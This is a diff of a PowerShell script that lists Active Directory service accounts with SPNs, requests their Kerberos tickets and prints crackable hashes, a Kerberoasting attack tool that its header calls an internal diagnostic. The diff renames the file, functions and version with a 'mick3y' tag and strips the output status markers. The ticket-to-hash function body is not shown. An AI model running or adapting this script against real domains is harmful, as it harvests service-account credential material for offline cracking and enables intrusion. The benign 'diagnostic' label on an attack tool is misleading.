@@ -1,20 +1,20 @@
 <#
 Version:
-  1.0.0
+  mick3y-1.0.0
 
 Usage:
-  .\ker.ps1
-  .\ker.ps1 -Domain contoso.local
-  .\ker.ps1 -Domain contoso.local -Server dc01.contoso.local
-  .\ker.ps1 -Domain contoso.local -SearchBase "OU=Servers,DC=contoso,DC=local"
+  .\kerberos.ps1
+  .\kerberos.ps1 -Domain contoso.local
+  .\kerberos.ps1 -Domain contoso.local -Server dc01.contoso.local
+  .\kerberos.ps1 -Domain contoso.local -SearchBase "OU=Servers,DC=contoso,DC=local"
 
 Purpose:
   Minimal internal diagnostic for confirming that SPN-backed service account
   ticket hashes can be requested and parsed successfully.
 
 Output:
-  [+] SamAccountName : Hash
-  [!] SamAccountName : reason
+  SamAccountName : Hash
+  SamAccountName : reason
 #>
 
 [CmdletBinding()]
@@ -32,9 +32,9 @@ param(
 Add-Type -AssemblyName System.DirectoryServices
 Add-Type -AssemblyName System.IdentityModel
 
-$ScriptVersion = '1.0.0'
+$ScriptVersion = 'mick3y-1.0.0'
 
-function Stop-Script {
+function Stop-Mick3yScript {
     param(
         [Parameter(Mandatory = $true)]
         [string]$Message
@@ -44,7 +44,7 @@ function Stop-Script {
     exit 1
 }
 
-function Convert-DomainToDn {
+function Convert-Mick3yDomainToDn {
     param(
         [Parameter(Mandatory = $true)]
         [string]$DomainName
@@ -53,24 +53,24 @@ function Convert-DomainToDn {
     return ($DomainName.Split('.') | ForEach-Object { "DC=$_" }) -join ','
 }
 
-function Get-DefaultDomainName {
+function Get-Mick3yCurrentDomainName {
     try {
         return [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
     }
     catch {
-        Stop-Script "Unable to determine the current domain. Specify -Domain explicitly."
+        Stop-Mick3yScript "Unable to determine the current domain. Specify -Domain explicitly."
     }
 }
 
-function Get-DirectorySearcher {
+function New-Mick3yDirectorySearcher {
     param(
         [string]$TargetDomain,
         [string]$TargetServer,
-        [string]$TargetSearchBase
+    [string]$TargetSearchBase
     )
 
     if ([string]::IsNullOrWhiteSpace($TargetDomain)) {
-        $TargetDomain = Get-DefaultDomainName
+        $TargetDomain = Get-Mick3yCurrentDomainName
     }
 
     $searchRoot = $null
@@ -99,7 +99,7 @@ function Get-DirectorySearcher {
         }
     }
     else {
-        $domainDn = Convert-DomainToDn -DomainName $TargetDomain
+        $domainDn = Convert-Mick3yDomainToDn -DomainName $TargetDomain
         if ($TargetServer) {
             $searchRoot = "LDAP://$TargetServer/$domainDn"
         }
@@ -118,14 +118,14 @@ function Get-DirectorySearcher {
     return $searcher
 }
 
-function Get-ServiceAccounts {
+function Get-Mick3yServiceAccountSpns {
     param(
         [string]$TargetDomain,
         [string]$TargetServer,
         [string]$TargetSearchBase
     )
 
-    $searcher = Get-DirectorySearcher -TargetDomain $TargetDomain -TargetServer $TargetServer -TargetSearchBase $TargetSearchBase
+    $searcher = New-Mick3yDirectorySearcher -TargetDomain $TargetDomain -TargetServer $TargetServer -TargetSearchBase $TargetSearchBase
     try {
         $searcher.Filter = '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'
         [void]$searcher.PropertiesToLoad.Add('samaccountname')
@@ -152,7 +152,7 @@ function Get-ServiceAccounts {
     }
 }
 
-function Convert-TicketToHash {
+function Convert-Mick3yKerberosTicketHash {
     param(
         [Parameter(Mandatory = $true)]
         [string]$ServicePrincipalName,
@@ -244,14 +244,14 @@ function Convert-TicketToHash {
 }
 
 if ($PSBoundParameters.ContainsKey('Domain') -and [string]::IsNullOrWhiteSpace($Domain)) {
-    Stop-Script "Domain cannot be empty."
+    Stop-Mick3yScript "Domain cannot be empty."
 }
 
-$resolvedDomain = if ([string]::IsNullOrWhiteSpace($Domain)) { Get-DefaultDomainName } else { $Domain }
+$resolvedDomain = if ([string]::IsNullOrWhiteSpace($Domain)) { Get-Mick3yCurrentDomainName } else { $Domain }
 
 Write-Host ("Kerberos Ticket Diagnostic v{0}" -f $ScriptVersion)
 
-$serviceAccounts = @(Get-ServiceAccounts -TargetDomain $resolvedDomain -TargetServer $Server -TargetSearchBase $SearchBase)
+$serviceAccounts = @(Get-Mick3yServiceAccountSpns -TargetDomain $resolvedDomain -TargetServer $Server -TargetSearchBase $SearchBase)
 
 if ($serviceAccounts.Count -eq 0) {
     Write-Host "No service accounts with SPNs were found."
@@ -262,15 +262,15 @@ $successCount = 0
 $failureCount = 0
 
 foreach ($account in $serviceAccounts) {
-    $result = Convert-TicketToHash -ServicePrincipalName $account.ServicePrincipalName -SamAccountName $account.SamAccountName -DistinguishedName $account.DistinguishedName -Format $OutputFormat
+    $result = Convert-Mick3yKerberosTicketHash -ServicePrincipalName $account.ServicePrincipalName -SamAccountName $account.SamAccountName -DistinguishedName $account.DistinguishedName -Format $OutputFormat
 
     if ($result.Hash) {
         $successCount++
-        Write-Host ("[+] {0} : {1}" -f $result.SamAccountName, $result.Hash)
+        Write-Host ("{0} : {1}" -f $result.SamAccountName, $result.Hash)
     }
     else {
         $failureCount++
-        Write-Host ("[!] {0} : {1}" -f $result.SamAccountName, $result.Error)
+        Write-Host ("{0} : {1}" -f $result.SamAccountName, $result.Error)
     }
 }
 
